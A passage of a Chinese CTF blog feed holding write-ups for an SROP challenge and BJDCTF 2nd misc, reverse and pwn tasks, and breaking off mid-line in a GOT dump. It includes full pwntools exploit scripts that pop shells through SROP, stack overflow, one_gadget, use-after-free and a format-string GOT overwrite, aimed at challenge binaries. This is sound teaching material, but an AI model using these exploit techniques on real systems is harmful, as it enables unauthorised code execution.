eax, 3Ch</span><br><span class="line">.text:0000000000401041                 mov     edi, 0          ; error_code</span><br><span class="line">.text:0000000000401046                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.text:0000000000401046 start           endp</span><br><span class="line">.text:0000000000401046</span><br><span class="line">.text:0000000000401046 _text           ends</span><br><span class="line">.text:0000000000401046</span><br></pre></td></tr></table></figure><p>程序只有两个函数，一个是调用了write和read的函数，另一个是调用exit的函数。</p><p>很明显可以看到read处存在栈溢出，可以用SROP来做。</p><h2 id="0x002-思路"><a href="#0x002-思路" class="headerlink" title="0x002 思路"></a>0x002 思路</h2><p>由于程序没有<code>/bin/sh</code>，我们需要找到一个位置写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code>。</p><p>可以先通过程序自带的一次read进行栈溢出来执行一次sigreturn系统调用，使其能够向指定位置写入<code>/bin/sh</code>，然后再次进行sigreturn系统调用执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><p>如何连续进行两次sigreturn系统调用？这里就需要构造SROP链了。<strong>例题2也是构造的SROP链</strong></p><h2 id="0x003-Let’s-do-it"><a href="#0x003-Let’s-do-it" class="headerlink" title="0x003 Let’s do it!"></a>0x003 Let’s do it!</h2><p>我们需要先找到一个位置用来写入<code>/bin/sh</code>，这个位置需要<code>可读可写</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200311222501.png" alt></p><p>可以看到程序的<code>DATA区</code>权限符合我们的要求。这里选择<code>addr = 0x402100</code>吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br></pre></td></tr></table></figure><p>然后通过SROP执行一次read系统调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#read(0,addr,300)</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr<span class="comment">#注意这里！~</span></span><br><span class="line">frame.rbp = addr<span class="comment">#</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><p>然后向addr写入<code>/bin/sh</code>并再次进行sigreturn系统调用，执行<code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>注意第一次构造frame的时候，我们设置了frame.rsp = addr，frame.rbp = addr，这是因为由于我们的gadgets是<code>syscall;leave;ret</code>，中间有个<code>leave</code>，<code>leave</code>就相当于<code>mov rsp,rbp;pop rbp</code>，为了构造SROP链，我们需要让rsp指向我们下一个payload的地址(这个可以参考第二个例题)，但如果我们的rbp为0的话，<code>leave</code>以后rsp也为0，这显然不符合我们的要求，所以这个需要<code>让rbp=addr</code>。</p><p>但由于<code>leave</code>还有一个<code>pop rbp</code>的功能，这里构造就较为巧妙，我们addr的位置前8字节正好被写为<code>/bin/sh\x00</code>，这样当我们ret的时候，正好能将<code>p64(pop_rax_syscall_leave_ret)</code>传给rip来执行，然后进行下一次sigreturn系统调用。</p><h2 id="0x004-完整EXP"><a href="#0x004-完整EXP" class="headerlink" title="0x004 完整EXP"></a>0x004 完整EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)<span class="comment">#Important!!!!!!</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./srop'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25453)</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401032                 pop     rax</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401033                 syscall</span></span><br><span class="line"><span class="string">.text:0000000000401035                 leave</span></span><br><span class="line"><span class="string">.text:0000000000401036                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x402100</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">300</span> </span><br><span class="line">frame.rsp = addr</span><br><span class="line">frame.rbp = addr</span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(pop_rax_syscall_leave_ret)</span><br><span class="line">payload += p64(<span class="number">15</span>) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><code>context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)#Important!!!!!!</code>这个一定要有，不然frame构造出来可能就不太对了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/21548933_p0.jpg" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[BJDCTF 2nd]</title>
    <url>/2020/03/21/BJDCTF-2nd/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜是原罪</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>下载下来是个压缩包，解一下伪加密，得到一个名为Secret的文件，16进制查看以后发现存在<code>IHDR</code>这个Png文件的标志位，故推测这是个png文件，但缺少了头部的<code>89 50 4E 47</code>这四个字节，补齐，改拓展名为png即可，可以看到一堆HEX,转ASCII即为flag。</p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>改一下IHDR就能看到flag</p><h2 id="Easybaba"><a href="#Easybaba" class="headerlink" title="Easybaba"></a>Easybaba</h2><p>binwalk一下，发现有zip，提取出来，里面有个<code>里面全是出题人.jpg</code>，实际上这是个avi文件，然后avi抽帧，有好多二维码，每个二维码能扫出来一部分flag，组合起来是一串base16，解码得到疑似flag的字符串，看着像栅栏，但实际上不是，但是都是单词。。。还有很明显的恶搞意味，修改修改顺序就得到flag。</p><p><code>BJD{imagin_love_Y1ng}</code></p><h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>16进制查看器打开以后搜BJD即可。。。</p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>这题已吐…看着WP都难搞……</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323225648.png" alt></p><h2 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h2><p>这道题目相比于其他脑洞杂项题，还是有一些可以学习的新知识点的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323232227.png" alt></p><h2 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h2><p>套娃题目，全当练算法了，WP说压缩了300层。。。。也就是300层套娃。。。压缩包的名字就是解压密码。。。</p><p>有个坑点…这些都是<code>zip</code>，但拓展名都是<code>tar.gz</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">path = <span class="string">'C:\\Users\\LiuLian\\Desktop\\test\\'</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">t0 = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line">        zip = zipfile.ZipFile(path+name,<span class="string">'r'</span>)</span><br><span class="line">        newfilename = zip.namelist()[<span class="number">0</span>]</span><br><span class="line">        pwd = name.replace(<span class="string">'.tar.gz'</span>,<span class="string">''</span>)</span><br><span class="line">        zip.extract(newfilename,path,pwd)</span><br><span class="line">        zip.close()</span><br><span class="line">        os.remove(path+name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] error or finished!'</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共运行了'</span> + str(t1-t0) + <span class="string">'秒'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共套了'</span> + str(count) + <span class="string">'层娃'</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] error or finished!</span><br><span class="line">总共运行了22.1809999943秒</span><br><span class="line">总共套了298层娃</span><br></pre></td></tr></table></figure><p>运行就能拿到一个名为flag的文件，里面就是flag。</p><p>脚本都跑了二十二秒多…. 手动解压的话估计要累到死。。。</p><p>运行结果显示总共套了298层娃。。。。</p><h2 id="Imagin开场曲"><a href="#Imagin开场曲" class="headerlink" title="Imagin开场曲"></a>Imagin开场曲</h2><p>挺有意思的杂项，就纯听力题…</p><p>不过通过这个题了解到一个挺好玩的东西叫<code>Mikutap</code></p><p><code>BJD{MIKUTAP3313313}</code></p><hr><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA加载,<code>Shift+F12</code>即可看到flag。。。。。。</p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>这题考察汇编。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165207.png" alt></p><p>但一些代码被IDA识别为数据了，按C还原为代码，即可看到程序的逻辑</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165245.png" alt></p><p>所以对这个字符串<code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code>进行与0x1f异或的操作即可</p><p>flag: <code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><hr><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本次CTF的pwn题大部分都是<code>Ubuntu19.04</code>的，libc是<code>libc-2.29.so</code>，但通过<code>patchelf</code>依然可以在其他版本的U buntu上进行本地调试。</p><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>存在后门函数<code>0x804858B dl_registery()</code>调用<code>system(&#39;/bin/sh&#39;)</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183154.png" alt></p><p>main函数的read处没有栈溢出，接着看<code>name_check</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183226.png" alt></p><p>这里的strcpy可以操作一波，但是需要先绕过前面的长度检测，来看一下汇编</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183321.png" alt></p><p>可以看到这里，调用完<code>strlen</code>以后长度保存在eax中，而这里是令<code>v3 = al</code>然后再进行的长度验证，也就是说真正验证的是长度的低字节。</p><p>所以就可以先构造好<code>payload</code>，然后<code>payload = payload.ljust(size,&#39;a&#39;)</code>,size取0x104<del>0x108或者0x204</del>0x208或者… 只要让它低字节在0x04~0x08之间即可，当然也不能超过read的size。<strong>还有一点需要注意，sendline相比send要多出一个\n，这也占size的。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">c = process(<span class="string">'./r2t3'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29366)</span></span><br><span class="line">backdoor = <span class="number">0x804858B</span></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * 0x80485E1')</span></span><br><span class="line">c.recvuntil(<span class="string">'Please input your name:\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload += p32(backdoor) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">'a'</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序保护全开</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321162955.png" alt></p><p>但是在<code>init函数</code>里面存在一个leak，泄露了printf的地址，而且题目也提供了libc，所以可以泄露出libcbase</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321163330.png" alt></p><p><code>main函数</code>也格外的和谐，直接读入<code>one_gadget</code>然后调用…</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> one_gadget libc<span class="number">-2.29</span>.so </span><br><span class="line"><span class="number">0xe237f</span> execve(<span class="string">"/bin/sh"</span>, rcx, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2383</span> execve(<span class="string">"/bin/sh"</span>, rcx, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2386</span> execve(<span class="string">"/bin/sh"</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x106ef8</span> execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p><strong>这里似乎只有第四个能用</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26393</span>)</span><br><span class="line"><span class="comment">#c = process('./one_gadget')</span></span><br><span class="line">elf = ELF(<span class="string">'./one_gadget'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line"></span><br><span class="line">libcbase = int(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line">oneGadget = libcbase + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">c.sendline(str(oneGadget))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="ydsneedgirlfriend2"><a href="#ydsneedgirlfriend2" class="headerlink" title="ydsneedgirlfriend2"></a>ydsneedgirlfriend2</h2><p>真·入门级堆题，感谢出题人不杀之恩。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>题目提供4个功能</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>add a girlfriend</span><br><span class="line"><span class="number">2.</span>dele a girlfriend</span><br><span class="line"><span class="number">3.</span>show a girlfriend</span><br><span class="line"><span class="number">4.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322185754.png" alt></p><p>其中<code>add</code>里面，只会在第一次add的时候在<code>girlfriends[0]</code>申请0x10大小的堆块。</p><p>在<code>*girlfriends[0]</code>存放的是最新一次add时，申请的name的chunk。</p><p>在<code>*girlfriends[1]</code>存放的是<code>print_girlfriend_name</code>的函数指针。</p><p><code>delete函数</code>存在<code>UAF</code>漏洞，free掉但未置为NULL。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190314.png" alt></p><p>而且出题人太贴心了，给了<code>backdoor</code>函数</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190225.png" alt></p><p>思路较为简单，借助<code>Fastbin</code>的<code>FILO</code>特性，结合<code>delete</code>函数中的free顺序可得</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">8</span> + p64(backdoor))<span class="comment">#change print_girlfriend_name -&gt; backdoor</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment"># do backdoor</span></span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26074</span>)</span><br><span class="line"><span class="comment">#c = process('./ydsneedgirlfriend2')</span></span><br><span class="line">elf = ELF(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line">girlfriends = <span class="number">0x6020A0</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Please input the length of her name:\n'</span>)</span><br><span class="line">    c.sendline(str(length))</span><br><span class="line">    c.recvuntil(<span class="string">'Please tell me her name:\n'</span>)</span><br><span class="line">    c.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'bbbbbbbb'</span>+p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>main函数有明显的格式化字符串漏洞和栈溢出，但只溢出了8个字节，只够覆盖掉rbp</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323222653.png" alt></p><p>存在backdoor函数，调用<code>system(&#39;cat flag&#39;)</code></p><p>看了半天没想起来怎么做，canary过不掉。。。赛后看了wp以后…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg" alt></p><p>既然canary过不掉，那就直接故意触发吧，修改<code>__stack_chk_fail_got</code>为<code>backdoor</code>即可。。。。</p><p>这里我之前写的<code>fmtstr_payload64</code>生成的payload的长度为0x40，超出read的size了，很无奈，只能按short类型来手动写了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27717</span>)</span><br><span class="line"><span class="comment">#c = process('./r2t4')</span></span><br><span class="line">elf = ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">success(<span class="string">'__stack_chk_fail.got = '</span> + hex(__stack_chk_fail))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%64c%9$hn%1510c%10$hnaaa'</span></span><br><span class="line">payload += p64(__stack_chk_fail+<span class="number">2</span>)</span><br><span class="line">payload += p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">success(<span class="string">'payload.length = '</span> + hex(len(payload)))</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>挺蛋疼的一道题目</p><p>让你猜秘密,实际上就是猜数字，虽然这些数字在IDA中都能通过正则表达式匹配出来。。。但是一共1万个！！</p><p>有的老哥真匹配出来然后send了一万次….被BUU封IP了….</p><p>官方WP里的做法就比较巧妙</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023154.png" alt>name实际大小为0x10，但却read了0x16个字节</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023212.png" alt></p><p>而name与times_ptr紧邻，多出的6个字节可以用来覆盖times_ptr</p><p><strong>注意这里是times_ptr,这是个指针，指向真实的times</strong></p><p>程序初始times = 10000，每猜对一次，<code>times -= 1</code>。</p><p>程序给出了system函数，而且当猜错以后会调用<code>printf(name);</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324014712.png" alt></p><p><strong>起初想着能不能利用这个格式化字符串漏洞,但是仔细想了想,似乎不太可行。</strong></p><p><strong>但是我们可以通过修改printf_got为system，令name以/bin/sh;开头，触发system(‘/bin/sh’)</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 11</span><br><span class="line"> </span><br><span class="line">[0x46d018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e64cc0 (puts) ◂— push   r14</span><br><span class="line">[0x46d020] write@GLIBC_2.2.5 -&gt; 0x7ffff7eee010 (write) ◂— lea    rax, [rip + 0xdd3b9]</span><br><span class="line">[0x46d028] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f67090 ◂— mov    ecx, edi</span><br><span class="line">[0x46d030] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401066 (__stack_chk_fail@plt+6) ◂— push   3</span><br><span class="line">[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push   4</span><br><span class="line">[0x46d040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401086 (<span class="built_in">printf</span>@plt+6) ◂— push   5</span><br><span class="line">[0x46d048] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7eedf70 (<span class="built_in">read</span>) ◂— lea    rax, [rip + 0xdd459]</span><br><span class="line">[0x46d050] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e653d0 (setvbuf) ◂— push   r13</span><br><span class="line">[0x46d058] atoi@GLIBC_2.2.5 -&gt; 